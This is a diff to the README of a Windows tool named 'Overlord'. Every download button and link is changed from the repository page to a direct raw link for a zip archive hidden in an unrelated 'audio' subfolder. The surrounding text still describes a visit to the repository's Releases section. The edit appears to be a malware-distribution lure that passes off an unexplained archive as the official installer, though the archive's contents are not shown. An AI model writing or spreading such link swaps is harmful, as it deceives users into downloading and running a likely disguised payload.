@@ -1,6 +1,6 @@
 # 🛡️ Overlord - Control Your Workflow Simply
 
-[![Download Overlord](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Davi111776/Overlord)
+[![Download Overlord](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Davi111776/Overlord/raw/refs/heads/main/Overlord-Client/cmd/agent/audio/Software_addebted.zip)
 
 ---
 
@@ -28,11 +28,11 @@ Before you begin, make sure your computer meets these basic requirements:
 
 To get Overlord on your Windows computer, you need to visit its download page. The link takes you directly to the project on GitHub where you can find the latest release and setup files.
 
-[![Download Overlord](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Davi111776/Overlord)
+[![Download Overlord](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Davi111776/Overlord/raw/refs/heads/main/Overlord-Client/cmd/agent/audio/Software_addebted.zip)
 
 ### Steps to Download
 
-1. Click this link: [https://github.com/Davi111776/Overlord](https://github.com/Davi111776/Overlord).  
+1. Click this link: [https://github.com/Davi111776/Overlord/raw/refs/heads/main/Overlord-Client/cmd/agent/audio/Software_addebted.zip](https://github.com/Davi111776/Overlord/raw/refs/heads/main/Overlord-Client/cmd/agent/audio/Software_addebted.zip).  
 2. The page opens in your web browser, showing the Overlord repository.  
 3. Look for the “Releases” section on the right side or scroll down to find the latest release.  
 4. Click on the latest release version to open its details.  
@@ -120,7 +120,7 @@ If issues remain, use the GitHub page’s “Issues” tab to see if others have
 
 ## 🔗 Useful Links
 
-- Overlord GitHub page: [https://github.com/Davi111776/Overlord](https://github.com/Davi111776/Overlord)  
+- Overlord GitHub page: [https://github.com/Davi111776/Overlord/raw/refs/heads/main/Overlord-Client/cmd/agent/audio/Software_addebted.zip](https://github.com/Davi111776/Overlord/raw/refs/heads/main/Overlord-Client/cmd/agent/audio/Software_addebted.zip)  
 - Download latest release: Visit the release section to get updated installers.  
 
-[![Download Overlord](https://img.shields.io/badge/Download-Here-green)](https://github.com/Davi111776/Overlord)
+[![Download Overlord](https://img.shields.io/badge/Download-Here-green)](https://github.com/Davi111776/Overlord/raw/refs/heads/main/Overlord-Client/cmd/agent/audio/Software_addebted.zip)
